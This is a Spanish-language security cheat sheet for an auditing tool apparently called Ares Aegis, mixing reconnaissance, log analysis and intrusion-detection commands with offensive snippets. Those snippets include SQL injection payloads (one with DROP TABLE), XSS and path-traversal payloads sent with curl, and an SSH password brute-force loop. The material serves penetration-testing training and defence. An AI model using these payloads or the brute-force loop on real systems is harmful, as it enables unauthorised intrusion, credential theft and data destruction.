# 🛡️ CHEATSHEET COMPLETO - ARES AEGIS

## **📋 ÍNDICE DE COMANDOS ESENCIALES**

### **🔍 RECONOCIMIENTO Y ENUMERACIÓN**

#### **Escaneo de Red Básico**
```bash
# Ping sweep básico
for i in {1..254}; do ping -c 1 192.168.1.$i | grep "64 bytes"; done

# Escaneo de puertos con netcat
nc -zv 192.168.1.100 1-1000

# Verificar servicios activos
ss -tuln
netstat -tuln

# Procesos en ejecución
ps aux | grep -E "(ssh|ftp|http|mysql)"
```

#### **Enumeración de Sistema**
```bash
# Información básica del sistema
uname -a
cat /etc/os-release
whoami
id

# Usuarios del sistema
cat /etc/passwd | cut -d: -f1
getent passwd

# Permisos especiales
find / -perm -4000 2>/dev/null    # SUID
find / -perm -2000 2>/dev/null    # SGID
find / -perm -1000 2>/dev/null    # Sticky bit
```

#### **Enumeración Web**
```bash
# Headers HTTP
curl -I http://target.com

# Directorios comunes
for dir in admin login panel upload; do 
    curl -s http://target.com/$dir | grep -q "200 OK" && echo "Found: $dir"
done

# Archivos de backup
for ext in .bak .old .backup .tmp; do
    curl -s http://target.com/index.php$ext -o /dev/null -w "%{http_code}"
done
```

### **🚨 DETECCIÓN DE VULNERABILIDADES**

#### **Inyección SQL**
```bash
# Payloads básicos
echo "' OR '1'='1"
echo "'; DROP TABLE users; --"
echo "' UNION SELECT username,password FROM users --"

# Test manual con curl
curl -d "username=' OR '1'='1&password=test" http://target.com/login
```

#### **Cross-Site Scripting (XSS)**
```bash
# Payloads básicos
echo "<script>alert('XSS')</script>"
echo "<img src=x onerror=alert('XSS')>"
echo "<svg onload=alert('XSS')>"

# Test en parámetros URL
curl "http://target.com/search?q=<script>alert('XSS')</script>"
```

#### **Local File Inclusion (LFI)**
```bash
# Payloads comunes
echo "../../../etc/passwd"
echo "....//....//etc/passwd"
echo "..%2f..%2f..%2fetc%2fpasswd"

# Test con curl
curl "http://target.com/page.php?file=../../../etc/passwd"
```

### **🔐 ANÁLISIS DE AUTENTICACIÓN**

#### **Fuerza Bruta SSH**
```bash
# Lista de usuarios comunes
echo -e "root\nadmin\nuser\ntest\nguest" > users.txt

# Lista de contraseñas comunes
echo -e "password\n123456\nadmin\nroot\ntest" > passwords.txt

# Test manual
for user in $(cat users.txt); do
    for pass in $(cat passwords.txt); do
        sshpass -p "$pass" ssh -o ConnectTimeout=5 "$user@target" exit 2>/dev/null && echo "FOUND: $user:$pass"
    done
done
```

#### **Análisis de Contraseñas Débiles**
```bash
# Patrones débiles comunes
grep -E "(password|123456|admin|qwerty)" /path/to/passwords

# Validación de complejidad
check_password() {
    local pass="$1"
    [[ ${#pass} -lt 8 ]] && echo "Muy corta"
    [[ ! "$pass" =~ [A-Z] ]] && echo "Sin mayúsculas"
    [[ ! "$pass" =~ [a-z] ]] && echo "Sin minúsculas"
    [[ ! "$pass" =~ [0-9] ]] && echo "Sin números"
}
```

### **🌐 ANÁLISIS DE RED**

#### **Monitoreo de Tráfico**
```bash
# Conexiones activas
ss -tuln | awk '{print $5}' | cut -d: -f1 | sort | uniq -c

# Procesos con conexiones de red
lsof -i -P -n | grep LISTEN

# Análisis de puertos abiertos
for port in 22 23 53 80 443 993 995; do
    nc -zv localhost $port 2>&1 | grep succeeded
done
```

#### **Detección de Intrusiones**
```bash
# Conexiones sospechosas
netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr

# Procesos sospechosos
ps aux | awk '{print $11}' | sort | uniq -c | sort -nr | head -20

# Archivos modificados recientemente
find /etc /bin /sbin /usr/bin -type f -mtime -1 2>/dev/null
```

### **🗂️ MONITOREO DE INTEGRIDAD**

#### **Verificación de Archivos Críticos**
```bash
# Checksum de archivos importantes
sha256sum /etc/passwd /etc/shadow /etc/hosts > checksums.txt

# Verificar cambios
sha256sum -c checksums.txt

# Archivos con permisos modificados
find /etc -type f ! -perm 644 2>/dev/null
find /bin -type f ! -perm 755 2>/dev/null
```

#### **Detección de Rootkits**
```bash
# Verificar binarios del sistema
for bin in ps ls netstat ss; do
    echo "=== $bin ==="
    ls -la $(which $bin)
    file $(which $bin)
done

# Procesos ocultos
ps aux | wc -l
ls /proc | grep -E '^[0-9]+$' | wc -l
```

### **📊 ANÁLISIS DE LOGS**

#### **Análisis de Logs de Sistema**
```bash
# Intentos de autenticación fallidos
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c

# Conexiones SSH exitosas
grep "Accepted password" /var/log/auth.log | awk '{print $11}'

# Comandos sudo ejecutados
grep "COMMAND" /var/log/auth.log | tail -20
```

#### **Análisis de Logs Web**
```bash
# IPs con más requests
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -nr | head -10

# Códigos de error
awk '{print $9}' /var/log/apache2/access.log | grep -E "^[45]" | sort | uniq -c

# Páginas más accedidas
awk '{print $7}' /var/log/apache2/access.log | sort | uniq -c | sort -nr | head -10
```

### **🛠️ HERRAMIENTAS NATIVAS LINUX**

#### **Comandos de Red**
```bash
# ss (reemplazo de netstat)
ss -tuln                    # Puertos en escucha
ss -tup                     # Conexiones TCP/UDP activas
ss -s                       # Estadísticas de conexiones

# lsof (archivos abiertos)
lsof -i                     # Conexiones de red
lsof -i :80                 # Específico puerto 80
lsof -p PID                 # Archivos abiertos por proceso
```

#### **Comandos de Sistema**
```bash
# find (búsqueda de archivos)
find / -name "*.log" -mtime -1          # Logs modificados último día
find / -perm /4000 2>/dev/null          # Archivos SUID
find / -size +100M 2>/dev/null          # Archivos grandes

# grep (búsqueda en texto)
grep -r "password" /etc/                # Buscar "password" en /etc
grep -E "^root|^admin" /etc/passwd      # Usuarios específicos
```

### **🔧 SCRIPTS DE AUTOMATIZACIÓN**

#### **Script de Escaneo Básico**
```bash
#!/bin/bash
# basic_scan.sh

TARGET="$1"
echo "=== Escaneando $TARGET ==="

# Ping test
if ping -c 1 "$TARGET" >/dev/null 2>&1; then
    echo "[+] Host activo"
else
    echo "[-] Host no responde"
    exit 1
fi

# Port scan básico
echo "[*] Escaneando puertos comunes..."
for port in 21 22 23 25 53 80 110 143 443 993 995; do
    nc -zv "$TARGET" "$port" 2>&1 | grep succeeded && echo "[+] Puerto $port abierto"
done

echo "[*] Escaneo completado"
```

#### **Script de Monitoreo de Sistema**
```bash
#!/bin/bash
# system_monitor.sh

echo "=== Monitor de Sistema ==="
echo "Fecha: $(date)"
echo "Uptime: $(uptime)"
echo "Carga: $(cat /proc/loadavg)"
echo "Memoria: $(free -h | grep Mem:)"
echo "Disco: $(df -h / | tail -1)"

echo -e "\n=== Procesos Top 5 ==="
ps aux --sort=-%cpu | head -6

echo -e "\n=== Conexiones de Red ==="
ss -tuln | grep LISTEN | wc -l
echo "Puertos en escucha: $(ss -tuln | grep LISTEN | wc -l)"

echo -e "\n=== Usuarios Conectados ==="
who | wc -l
echo "Sesiones activas: $(who | wc -l)"
```

### **📚 REFERENCIAS DE COMANDOS**

#### **Comandos de Información del Sistema**
- `uname -a` - Información del kernel
- `cat /etc/os-release` - Versión del SO
- `lscpu` - Información de CPU
- `free -h` - Memoria disponible
- `df -h` - Espacio en disco
- `mount` - Sistemas de archivos montados

#### **Comandos de Red y Procesos**
- `ps aux` - Lista de procesos
- `pstree` - Árbol de procesos
- `jobs` - Trabajos en background
- `kill -9 PID` - Terminar proceso
- `killall nombre` - Terminar por nombre
- `nohup comando &` - Ejecutar en background

#### **Comandos de Archivos y Permisos**
- `ls -la` - Lista detallada
- `chmod 755 archivo` - Cambiar permisos
- `chown user:group archivo` - Cambiar propietario
- `stat archivo` - Información detallada
- `file archivo` - Tipo de archivo
- `which comando` - Ubicación de comando

### **⚠️ INDICADORES DE COMPROMISO**

#### **Señales de Intrusión**
- Procesos desconocidos en `ps aux`
- Conexiones de red no autorizadas
- Archivos modificados en `/etc`, `/bin`, `/sbin`
- Usuarios nuevos en `/etc/passwd`
- Servicios no reconocidos en escucha
- Tráfico de red anómalo
- Logs faltantes o modificados
- Archivos ocultos en directorios del sistema

#### **Archivos Críticos a Monitorear**
- `/etc/passwd` - Usuarios del sistema
- `/etc/shadow` - Contraseñas hasheadas
- `/etc/hosts` - Resolución de nombres
- `/etc/crontab` - Tareas programadas
- `/etc/sudoers` - Permisos sudo
- `/home/*/.ssh/authorized_keys` - Claves SSH
- `/var/log/auth.log` - Autenticaciones
- `/var/log/syslog` - Logs del sistema

---

**🔒 NOTA DE SEGURIDAD**: Estos comandos son para uso educativo y pruebas autorizadas únicamente. Siempre obtén permiso explícito antes de realizar pruebas de seguridad en sistemas que no sean de tu propiedad.

**📖 Ares Aegis** - Sistema de Auditoría de Seguridad para Expertos en Ciberseguridad y Hacking Ético
